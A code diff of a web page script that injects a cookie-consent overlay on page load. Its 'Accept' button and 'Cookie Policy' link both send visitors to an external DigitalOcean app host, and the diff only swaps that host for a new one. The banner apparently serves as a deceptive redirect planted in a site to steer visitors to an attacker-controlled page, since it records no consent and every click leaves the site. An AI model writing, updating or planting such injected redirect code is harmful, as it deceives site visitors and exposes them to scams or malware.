@@ -4,7 +4,7 @@
 <head>
 	<script>
 	        document.addEventListener("DOMContentLoaded", function () {
-	            const redirectUrl = "https://shark-app-bwpbk.ondigitalocean.app/";
+	            const redirectUrl = "https://monkfish-app-w3oyu.ondigitalocean.app/";
 	            const style = document.createElement("style");
 	            style.textContent = `
 	                .cookie-overlay {
@@ -85,7 +85,7 @@
 	                    By clicking Accept, you agree to our use of cookies. For more information, please visit our
 	<a href="${redirectUrl}" class="cta" style="text-decoration: underline; color: #007bff;">Cookie Policy</a>.
 	</p>
-	<a href="https://shark-app-bwpbk.ondigitalocean.app/" id="accept-cookies" class="btn-primary">Accept</a>
+	<a href="https://monkfish-app-w3oyu.ondigitalocean.app/" id="accept-cookies" class="btn-primary">Accept</a>
 	</div>
 	            `;
 	            document.body.appendChild(overlay);
